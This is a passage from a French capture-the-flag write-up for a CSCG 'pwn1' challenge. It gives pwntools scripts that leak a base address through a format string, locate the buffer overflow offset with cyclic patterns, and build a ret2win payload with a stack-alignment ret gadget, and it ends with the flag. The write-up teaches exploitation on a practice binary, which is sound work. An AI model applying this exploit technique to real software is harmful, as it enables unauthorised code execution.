</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/german_fcsc/pwn//upload_ae5c5b0841fb4cfe9d32bb697e331cb0.png data-srcset="/lib/images/writeups/german_fcsc/pwn//upload_ae5c5b0841fb4cfe9d32bb697e331cb0.png, /lib/images/writeups/german_fcsc/pwn//upload_ae5c5b0841fb4cfe9d32bb697e331cb0.png 1.5x, /lib/images/writeups/german_fcsc/pwn//upload_ae5c5b0841fb4cfe9d32bb697e331cb0.png 2x" data-sizes=auto alt=/lib/images/writeups/german_fcsc/pwn//upload_ae5c5b0841fb4cfe9d32bb697e331cb0.png title=/lib/images/writeups/german_fcsc/pwn//upload_ae5c5b0841fb4cfe9d32bb697e331cb0.png></p><p>Pour rappel, la fonction win ressemble à ceci en C:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/german_fcsc/pwn//upload_2b48f737e939725bc10cd7147604168e.png data-srcset="/lib/images/writeups/german_fcsc/pwn//upload_2b48f737e939725bc10cd7147604168e.png, /lib/images/writeups/german_fcsc/pwn//upload_2b48f737e939725bc10cd7147604168e.png 1.5x, /lib/images/writeups/german_fcsc/pwn//upload_2b48f737e939725bc10cd7147604168e.png 2x" data-sizes=auto alt=/lib/images/writeups/german_fcsc/pwn//upload_2b48f737e939725bc10cd7147604168e.png title=/lib/images/writeups/german_fcsc/pwn//upload_2b48f737e939725bc10cd7147604168e.png></p><h2 id=exploitation-du-buffer-overflow>Exploitation du buffer overflow</h2><p>Maintenant qu&rsquo;il est possible re calculer l&rsquo;adresse de la fonction win, il faut pouvoir exploiter le buffer overflow et jump dessus. Pour cela, il faut connaitre le padding de ce buffer et voir lorsqu&rsquo;il segfault.</p><p>Pour cela, regardons la fonction &ldquo;AAAAAAAA&rdquo; de plus près:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/german_fcsc/pwn//upload_a60bfa047591a673e9478d59fa406b35.png data-srcset="/lib/images/writeups/german_fcsc/pwn//upload_a60bfa047591a673e9478d59fa406b35.png, /lib/images/writeups/german_fcsc/pwn//upload_a60bfa047591a673e9478d59fa406b35.png 1.5x, /lib/images/writeups/german_fcsc/pwn//upload_a60bfa047591a673e9478d59fa406b35.png 2x" data-sizes=auto alt=/lib/images/writeups/german_fcsc/pwn//upload_a60bfa047591a673e9478d59fa406b35.png title=/lib/images/writeups/german_fcsc/pwn//upload_a60bfa047591a673e9478d59fa406b35.png></p><p>Il faut entrer un &ldquo;secret&rdquo; afin de pouvoir exploiter la vulnérabilité, sinon le programme se termine. De plus, on sait que le buffer est d&rsquo;une taille de &ldquo;0xff&rdquo;.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/python2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>FORMATSTRING</span> <span class=o>=</span> <span class=s2>&#34;|%47$p|&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./pwn1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;name:&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>FORMATSTRING</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>leak</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;spell:&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;|&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>base_addr</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>leak</span><span class=p>[</span><span class=o>-</span><span class=mi>2</span><span class=p>],</span> <span class=mi>16</span><span class=p>)</span><span class=o>-</span><span class=mh>0x36f</span>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;Adresse de base: </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>base_addr</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>win_offset</span> <span class=o>=</span> <span class=n>base_addr</span><span class=o>+</span><span class=mh>0x267</span>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;Adresse de la fonction win: </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>win_offset</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>raw_input</span><span class=p>(</span><span class=s2>&#34;gdb attach&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;Expelliarmus</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=o>+</span><span class=n>cyclic</span><span class=p>(</span><span class=mh>0xfff</span><span class=p>))</span> <span class=c1># &lt;-- PAYLOAD</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>On place notre payload après le &ldquo;raw_input()&rdquo; afin de pouvoir s&rsquo;attacher et process et voir où il crash.</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/german_fcsc/pwn//upload_cd368400aa6308cb2c4dc69eb32efbb8.png data-srcset="/lib/images/writeups/german_fcsc/pwn//upload_cd368400aa6308cb2c4dc69eb32efbb8.png, /lib/images/writeups/german_fcsc/pwn//upload_cd368400aa6308cb2c4dc69eb32efbb8.png 1.5x, /lib/images/writeups/german_fcsc/pwn//upload_cd368400aa6308cb2c4dc69eb32efbb8.png 2x" data-sizes=auto alt=/lib/images/writeups/german_fcsc/pwn//upload_cd368400aa6308cb2c4dc69eb32efbb8.png title=/lib/images/writeups/german_fcsc/pwn//upload_cd368400aa6308cb2c4dc69eb32efbb8.png></p><p>L&rsquo;adresse situé dans le registre RIP contient en réalité une chaine de caractère &ldquo;cnaacoaa&rdquo;. Cette chaine est le résultat de la fonction &ldquo;cyclic&rdquo;, qui va générer une chaine d&rsquo;une taille demandée unique permettant de connaitre la taille du buffer avant le crash.</p><p>Maintenant que l&rsquo;on connait la taille du buffer, il est possible de contrôler RIP et ainsi pouvoir jump sur la fonction win.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/python2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>FORMATSTRING</span> <span class=o>=</span> <span class=s2>&#34;|%47$p|&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./pwn1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;name:&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>FORMATSTRING</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>leak</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;spell:&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;|&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>base_addr</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>leak</span><span class=p>[</span><span class=o>-</span><span class=mi>2</span><span class=p>],</span> <span class=mi>16</span><span class=p>)</span><span class=o>-</span><span class=mh>0x36f</span>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;Adresse de base: </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>base_addr</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>win_offset</span> <span class=o>=</span> <span class=n>base_addr</span><span class=o>+</span><span class=mh>0x267</span>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;Adresse de la fonction win: </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>win_offset</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>raw_input</span><span class=p>(</span><span class=s2>&#34;gdb attach&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>PAYLOAD</span> <span class=o>=</span> <span class=s2>&#34;Expelliarmus</span><span class=se>\x00</span><span class=s2>&#34;</span>        <span class=c1># &lt;-- Secret</span>
</span></span><span class=line><span class=cl><span class=n>PAYLOAD</span> <span class=o>+=</span> <span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=n>cyclic_find</span><span class=p>(</span><span class=s2>&#34;cnaa&#34;</span><span class=p>)</span>  <span class=c1># &lt;-- PADDING</span>
</span></span><span class=line><span class=cl><span class=n>PAYLOAD</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>win_offset</span><span class=p>)</span>          <span class=c1># &lt;-- Jump vers la fonction win</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>PAYLOAD</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>Le payload devrait fonctionner, mais le programme segfault quand même:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/german_fcsc/pwn//upload_87522ae9b2a2734684aa5b7939396a6e.png data-srcset="/lib/images/writeups/german_fcsc/pwn//upload_87522ae9b2a2734684aa5b7939396a6e.png, /lib/images/writeups/german_fcsc/pwn//upload_87522ae9b2a2734684aa5b7939396a6e.png 1.5x, /lib/images/writeups/german_fcsc/pwn//upload_87522ae9b2a2734684aa5b7939396a6e.png 2x" data-sizes=auto alt=/lib/images/writeups/german_fcsc/pwn//upload_87522ae9b2a2734684aa5b7939396a6e.png title=/lib/images/writeups/german_fcsc/pwn//upload_87522ae9b2a2734684aa5b7939396a6e.png></p><p>En effet, l&rsquo;adresse sur RSP doit être alignée, donc se terminer par &ldquo;0&rdquo;. En l&rsquo;occurence, la stack n&rsquo;est pas aligné, donc il faut ajouter un &ldquo;ret&rdquo; sur la stack pour la réaligner. Pour trouver un gadget &ldquo;ret&rdquo;, il suffit de le calculer de quelque part:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/german_fcsc/pwn//upload_d768f33d01ca5c2deb6a3ec6b1ec693e.png data-srcset="/lib/images/writeups/german_fcsc/pwn//upload_d768f33d01ca5c2deb6a3ec6b1ec693e.png, /lib/images/writeups/german_fcsc/pwn//upload_d768f33d01ca5c2deb6a3ec6b1ec693e.png 1.5x, /lib/images/writeups/german_fcsc/pwn//upload_d768f33d01ca5c2deb6a3ec6b1ec693e.png 2x" data-sizes=auto alt=/lib/images/writeups/german_fcsc/pwn//upload_d768f33d01ca5c2deb6a3ec6b1ec693e.png title=/lib/images/writeups/german_fcsc/pwn//upload_d768f33d01ca5c2deb6a3ec6b1ec693e.png></p><p>La fonction win est le plus simple étant donné qu&rsquo;on a son adresse dans notre script d&rsquo;exploitation. Le script final est donc:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/python2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>HOST</span> <span class=o>=</span> <span class=s2>&#34;hax1.allesctf.net&#34;</span>
</span></span><span class=line><span class=cl><span class=n>PORT</span> <span class=o>=</span> <span class=mi>9100</span>
</span></span><span class=line><span class=cl><span class=n>FORMATSTRING</span> <span class=o>=</span> <span class=s2>&#34;|%47$p|&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./pwn1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#p = remote(HOST, PORT)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;name:&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>FORMATSTRING</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>leak</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;spell:&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;|&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>base_addr</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>leak</span><span class=p>[</span><span class=o>-</span><span class=mi>2</span><span class=p>],</span> <span class=mi>16</span><span class=p>)</span><span class=o>-</span><span class=mh>0x36f</span>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;Adresse de base: </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>base_addr</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>win_offset</span> <span class=o>=</span> <span class=n>base_addr</span><span class=o>+</span><span class=mh>0x267</span>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;Adresse de la fonction win: </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>win_offset</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>ret_gadget</span> <span class=o>=</span> <span class=n>win_offset</span><span class=o>+</span><span class=mh>0x36</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>raw_input</span><span class=p>(</span><span class=s2>&#34;gdb attach&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>PAYLOAD</span> <span class=o>=</span> <span class=s2>&#34;Expelliarmus</span><span class=se>\x00</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>PAYLOAD</span> <span class=o>+=</span> <span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=n>cyclic_find</span><span class=p>(</span><span class=s2>&#34;cnaa&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>PAYLOAD</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>ret_gadget</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>PAYLOAD</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>win_offset</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>PAYLOAD</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/german_fcsc/pwn//upload_1fa334b0232b7d042a83359fbfd2efba.png data-srcset="/lib/images/writeups/german_fcsc/pwn//upload_1fa334b0232b7d042a83359fbfd2efba.png, /lib/images/writeups/german_fcsc/pwn//upload_1fa334b0232b7d042a83359fbfd2efba.png 1.5x, /lib/images/writeups/german_fcsc/pwn//upload_1fa334b0232b7d042a83359fbfd2efba.png 2x" data-sizes=auto alt=/lib/images/writeups/german_fcsc/pwn//upload_1fa334b0232b7d042a83359fbfd2efba.png title=/lib/images/writeups/german_fcsc/pwn//upload_1fa334b0232b7d042a83359fbfd2efba.png></p><h2 id=flag>Flag</h2><blockquote><p>CSCG{NOW_PRACTICE_MORE}</p></blockquote></div></div></div></main><footer class=footer><div class=footer-container><div class=footer-line>Powered by <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.100.2">Hugo</a> | Theme - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden=true></i> LoveIt</a></div><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2017 - 2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=maki.bzh/ target=_blank>Maki - Alan Marrec</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:50},comment:{},lightgallery:!0}</script><script type=text/javascript src=/maki.bzh/js/theme.min.js></script><script type=text/javascript>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-WVPYCS7SPM',{anonymize_ip:!0})</script><script type=text/javascript src="https://www.googletagmanager.com/gtag/js?id=G-WVPYCS7SPM" async></script></body></html>